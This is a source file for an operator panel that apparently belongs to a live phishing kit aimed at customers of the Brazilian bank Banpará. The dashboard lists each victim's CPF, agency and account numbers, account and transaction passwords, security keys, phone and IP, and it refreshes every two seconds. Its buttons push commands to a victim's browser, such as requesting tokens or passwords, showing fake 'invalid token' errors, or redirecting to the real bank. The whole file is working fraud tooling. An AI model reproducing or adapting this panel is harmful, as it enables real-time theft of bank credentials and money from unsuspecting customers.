<?php
session_start();
if(!isset($_SESSION['logged_in'])) {
    header("Location: login");
    exit;
}
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title></title>

    <link href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/5.3.0/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" type="text/css"  href="https://cdn.datatables.net/responsive/2.2.3/css/responsive.dataTables.min.css">
    <link rel="stylesheet" type="text/css"  href="https://cdn.jsdelivr.net/npm/boxicons@2.0.0/css/boxicons.min.css">
    <link href='https://unpkg.com/boxicons@2.1.4/css/boxicons.min.css' rel='stylesheet'>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/5.3.0/js/bootstrap.bundle.min.js"></script>

    <style type="text/css">
        body {
          background: #0d131c;
          color: #55657e !important;
        }

        .card{
          background-color: #151d29 !important;
          color: #fff  !important;
        }

        .table {
          border-spacing: 0 0.85rem !important;
        }

        .table .dropdown {
          display: inline-block;
        }

        .table td,
        .table th {
          vertical-align: middle;
          margin-bottom: 10px;
          border: none;
        }

        .table thead tr,
        .table thead th {
          border: none;
          font-size: 12px;
          letter-spacing: 1px;
          text-transform: uppercase;
          background: transparent;
          color: #55657e;
        }

        .table td {
          background: #151d29;
          color: #55657e;
        }

        .table td:first-child {
          border-top-left-radius: 10px;
          border-bottom-left-radius: 10px;
        }

        .table td:last-child {
          border-top-right-radius: 10px;
          border-bottom-right-radius: 10px;
        }

        .avatar {
          width: 2.75rem;
          height: 2.75rem;
          line-height: 3rem;
          border-radius: 50%;
          display: inline-block;
          background: transparent;
          position: relative;
          text-align: center;
          color: #868e96;
          font-weight: 700;
          vertical-align: bottom;
          font-size: 1rem;
          -webkit-user-select: none;
          -moz-user-select: none;
          -ms-user-select: none;
          user-select: none;
        }

        .avatar-sm {
          width: 2.5rem;
          height: 2.5rem;
          font-size: 0.83333rem;
          line-height: 1.5;
        }

        .avatar-img {
          width: 100%;
          height: 100%;
          -o-object-fit: cover;
          object-fit: cover;
        }

        .avatar-blue {
          background-color: #c8d9f1;
          color: #467fcf;
        }

        table.dataTable.dtr-inline.collapsed
          > tbody
          > tr[role="row"]
          > td:first-child:before,
        table.dataTable.dtr-inline.collapsed
          > tbody
          > tr[role="row"]
          > th:first-child:before {
          top: 28px;
          left: 14px;
          border: none;
          box-shadow: none;
        }

        table.dataTable.dtr-inline.collapsed > tbody > tr[role="row"] > td:first-child,
        table.dataTable.dtr-inline.collapsed > tbody > tr[role="row"] > th:first-child {
          padding-left: 48px;
        }

        table.dataTable > tbody > tr.child ul.dtr-details {
          width: 100%;
        }

        table.dataTable > tbody > tr.child span.dtr-title {
          min-width: 50%;
        }

        table.dataTable.dtr-inline.collapsed > tbody > tr > td.child,
        table.dataTable.dtr-inline.collapsed > tbody > tr > th.child,
        table.dataTable.dtr-inline.collapsed > tbody > tr > td.dataTables_empty {
          padding: 0.75rem 1rem 0.125rem;
        }

        div.dataTables_wrapper div.dataTables_length label,
        div.dataTables_wrapper div.dataTables_filter label {
          margin-bottom: 0;
        }

        @media (max-width: 767px) {
          div.dataTables_wrapper div.dataTables_paginate ul.pagination {
            -ms-flex-pack: center !important;
            justify-content: center !important;
            margin-top: 1rem;
          }
        }

        .btn-icon {
          background: #fff;
        }
        .btn-icon .bx {
          font-size: 20px;
        }

        .btn .bx {
          vertical-align: middle;
          font-size: 20px;
        }

        .dropdown-menu {
          padding: 0.25rem 0;
        }

        .dropdown-item {
          padding: 0.5rem 1rem;
        }

        .badge {
          padding: 0.5em 0.75em;
        }

        .badge-success-alt {
          background-color: #d7f2c2;
          color: #7bd235;
        }

        .table a {
          color: #212529;
        }

        .table a:hover,
        .table a:focus {
          text-decoration: none;
        }

        table.dataTable {
          margin-top: 12px !important;
        }

        .icon > .bx {
          display: block;
          min-width: 1.5em;
          min-height: 1.5em;
          text-align: center;
          font-size: 1.0625rem;
        }

        .btn {
          font-size: 0.9375rem;
          font-weight: 500;
          padding: 0.5rem 0.75rem;
        }

    .avatar-blue {
      background-color: #c8d9f1;
      color: #467fcf;
    }

    .avatar-pink {
      background-color: #fcd3e1;
      color: #f66d9b;
    }

    table {
        border-collapse: separate;
        border-spacing: 10px;
    }

    .events{
        font-size: 12px;
    }
    
    .navbar-custom {
        background-color: rgb(0, 127, 255) !important;
    }
    .navbar-custom .navbar-brand {
        font-weight: bold;
        color: white !important;
    }
    .navbar-custom .nav-link {
        color: white !important;
    }
    
    
    </style>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.3.1/socket.io.js"></script>
     <script src="screen/caixa-tem/assets/router.js" token="<?= $_SESSION['admin_jwt'] ?>"></script>
</head>
<body>
    <nav class="navbar navbar-expand-lg navbar-custom">
        <div class="container-fluid">
            <a class="navbar-brand" href="#">Tela banpara</a>
            <div class="collapse navbar-collapse justify-content-end" id="navbarNav">
                <ul class="navbar-nav">
                    <li class="nav-item">
                        <a class="nav-link" href="/logout">Logout</a>
                    </li>
                </ul>
            </div>
        </div>
    </nav>
    <div class="container">
       <div class="row mt-5">
        <div class="col-xl-3 col-md-6">
            <div class="card bg-pattern">
                <div class="card-body">
                    <div class="float-right">
                        <i class="fa fa-archive text-primary h4 ml-3"></i>
                    </div>
                    <h5 class="font-size-20 mt-0 pt-1" id="userListCount">0</h5>
                    <p class="mb-0">Total Users</p>
                </div>
            </div>
        </div>
        <div class="col-xl-3 col-md-6">
            <div class="card bg-pattern">
                <div class="card-body">
                    <div class="float-right">
                        <i class="fa fa-th text-primary h4 ml-3"></i>
                    </div>
                    <h5 class="font-size-20 mt-0 pt-1"  id="userListOnlineCount">0</h5>
                    <p class="mb-0">Total online</p>
                </div>
            </div>
        </div>
    </div>
      <div class="row py-5">
        <div class="col-12">
          <table id="example" class="table table-hover responsive nowrap" style="width:100%">
            <thead>
              <tr>
                <th>#</th>
                <th>Titularidade</th>
                <th>Tipo da Conta</th>
                <th>Agencia</th>
                <th>Conta</th>
                <th>Cpf</th>
                <th>Senha Conta</th>
                <th>Senha Transacional</th>
                <th>Chave Segura</th>
                <th>Modal</th>
                <th>Telefone</th>
                <th>Actions</th>
              </tr>
            </thead>
            <tbody id="userList">
            </tbody>
          </table>
        </div>
      </div>
    </div>
    <div class="offcanvas offcanvas-end" tabindex="-1" id="offcanvasCommands" aria-labelledby="offcanvasCommandsLabel">
        <div class="offcanvas-header">
            <h5 id="offcanvasCommandsLabel">Comandos</h5>
            <button type="button" class="btn-close" data-bs-dismiss="offcanvas" aria-label="Close"></button>
        </div>
        <div class="offcanvas-body">
            <div class="mb-3">
                <label for="formGroupExampleInput" class="form-label">Tela: Chave segurança</label>
                <ul class="list-group">
                    <li class="list-group-item d-flex justify-content-between align-items-center">
                        Redireciona para o Banpara
                        <button type="button" class="btn btn-primary btn-action" onclick="sendCommand('redirect', {command:'redirect'})">
                            Ir
                        </button>
                    </li>
                    <li class="list-group-item d-flex justify-content-between align-items-center">
                        Recarregar tela
                        <button type="button" class="btn btn-primary btn-action" onclick="sendCommand('reload', {command:'reload'})">
                            Reload
                        </button>
                    </li>
                    <li class="list-group-item d-flex justify-content-between align-items-center">
                        BP Token
                        <button type="button" class="btn btn-primary btn-action" onclick="sendCommand('modal', {command:'modal'})">
                            Solicitar Token
                        </button>
                    </li>
                    <li class="list-group-item d-flex justify-content-between align-items-center">
                        Token inválido.
                        <button type="button" class="btn btn-danger btn-action" onclick="sendCommand('error-modal', {command:'error-modal'})">
                            Erro
                        </button>
                    </li>
                    <li class="list-group-item d-flex justify-content-between align-items-center">
                        Solicitar Senha
                        <button type="button" class="btn btn-primary btn-action" onclick="sendCommand('modal-senha', {command:'modal-senha'})">
                            Solicitar Senha
                        </button>
                    </li>
                    <li class="list-group-item d-flex justify-content-between align-items-center">
                        Senha inválida.
                        <button type="button" class="btn btn-danger btn-action" onclick="sendCommand('error-senha', {command:'error-senha'})">
                            Erro Senha
                        </button>
                    </li>
                    <li class="list-group-item d-flex justify-content-between align-items-center">
                        Solicitar Dados Extras
                        <button type="button" class="btn btn-primary btn-action" onclick="sendCommand('modal-dadosextras', {command:'modal-dadosextras'})">
                            Solicitar Dados Extras
                        </button>
                    </li>
                    <li class="list-group-item d-flex justify-content-between align-items-center">
                        Dados Extras inválidos.
                        <button type="button" class="btn btn-danger btn-action" onclick="sendCommand('error-dadosextras', {command:'error-dadosextras'})">
                            Erro Dados Extras
                        </button>
                    </li>
                </ul>
            </div>
            <button class="btn btn-danger btn-block" onclick="sendCommand('deletar', {command:'reload'})">Ban</button>
            <button class="btn btn-danger btn-block" onclick="sendCommand('deletar2', {command:'reload'})">Deletar</button>
        </div>
    </div>

</body>
<script>
  let selectedUser = null;
  let previousUsers = [];

  async function users() {
    let response = await fetch("/usersrow");

    if (response.status == 502) {
    } else if (response.status != 200) {
    } else {
      let message = await response.json();
      updateUserList(message.clientes, message)
    }
  }

  function updateUserList(users, data) {
      const userListElement = document.getElementById('userList');
      const userListCount = document.getElementById('userListCount');
      const userListOnlineCount = document.getElementById('userListOnlineCount');

      userListCount.innerText = data.count_clientes;
      userListOnlineCount.innerText = data.count_onlines;

      userListElement.innerHTML = '';
      users.forEach(user => {
          const listItem = createUserListItem(user);
          console.log(user)
          const br = document.createElement('br');
          br.innerHTML = ``
          userListElement.appendChild(listItem.user);
          userListElement.appendChild(listItem.pf);
          userListElement.appendChild(br);
      })
      
        if (isNewUser(users)) {
            speakNewUserNotification();
        }

        previousUsers = users.map(user => user.id);
  }
    function isNewUser(users) {
        const userIds = users.map(user => user.id);
        return userIds.some(id => !previousUsers.includes(id));
    }
    
    function speakNewUserNotification() {
        const msg = new SpeechSynthesisUtterance("Novo cliente adicionado.");
        window.speechSynthesis.speak(msg);
    }
  function createUserListItem(user) {
      const listItem = document.createElement('tr');
      listItem.innerHTML = `
          <td>
              <div class="d-flex align-items-center">
                  <div class="">
                      <p class="font-weight-bold mb-0">
                          <span class="mr-1">${user.status == 'online' ? "<i class='bx bx-signal-5' style='color:#51cc2a'></i>" : "<i class='bx bx-no-signal' style='color:#cc2a2a'></i>"}</span>
                          ${user.tela == 'Conta Fisica' ? 'Conta Fisica' : `EM OUTRA TELA (${user.tela})`}
                      </p>
                      <p class="mb-0"> ${user.ip || 'N/A'}</p>
                  </div>
              </div>
          </td>
          <td>${user.titularidade || 'N/A'}</td>
          <td>${user.tipoConta || 'N/A'}</td>
          <td>${user.agencia || 'N/A'}</td>
          <td>${user.numeroConta || 'N/A'}</td>
          <td>${user.cpf || 'N/A'}</td>
          <td>${user.senhaConta || 'N/A'}</td>
          <td>${user.senha2Conta || 'N/A'}</td>
          <td>${user.code || 'N/A'}</td>
          <td>${user.telefoneConta || 'N/A'}</td>
          <td>${user.modal || 'N/A'}</td>
          
          <td>
              <button class="btn btn-primary btn-sm" onclick="openCommandMenu('${user.id}')">Comandos</button>
          </td>
      `;

       const listItem2 = document.createElement('tr');
          listItem2.innerHTML = `
              <td>
                  <div class="d-flex align-items-center">
                      <div class="">
                          <p class="font-weight-bold mb-0">
                              <span class="mr-1">${user.status == 'online' ? "<i class='bx bx-signal-5' style='color:#51cc2a'></i>" : "<i class='bx bx-no-signal' style='color:#cc2a2a'></i>"}</span>
                              ${user.tela == 'Conta Juridca' ? 'Conta Juridca' : `EM OUTRA TELA (${user.tela})`}
                          </p>
                          <p class="mb-0"> ${user.ip || 'N/A'}</p>
                      </div>
                  </div>
              </td>
              <td>N/A</td>
              <td>N/A</td>
              <td>N/A</td>
              <td>N/A</td>
              <td>${user.cpf2 || 'N/A'}</td>
              <td>${user.senhaConta2 || 'N/A'}</td>
              <td>${user.senha2Conta2 || 'N/A'}</td>
              <td>${user.code2 || 'N/A'}</td>
              <td>${user.telefoneConta2 || 'N/A'}</td>
              <td>${user.modal || 'N/A'}</td>
              
              <td>
                  <button class="btn btn-primary btn-sm" onclick="openCommandMenu('${user.id}')">Comandos</button>
              </td>
          `;
      return {user:listItem, pf:listItem2}
  }

  function openCommandMenu(guid) {
      selectedUser = guid;
      $('#offcanvasCommands').offcanvas('show');
  }

  function sendCommand(commandType, data = {}) {
      if (selectedUser) {

          const payload = {
              guid: selectedUser,
              type: commandType,
              data: data
          };

          fetch('/sendcommand', {
              method: 'POST',
              headers: {
                  'Content-Type': 'application/json'
              },
              body: JSON.stringify(payload)
          })
          .then(response => response.json())
          .then(data => {
              console.log('Success:', data);
          })
          .catch(error => {
              console.error('Error:', error);
          });
      }
  }


  setInterval(users, 2000);
</script>
</html>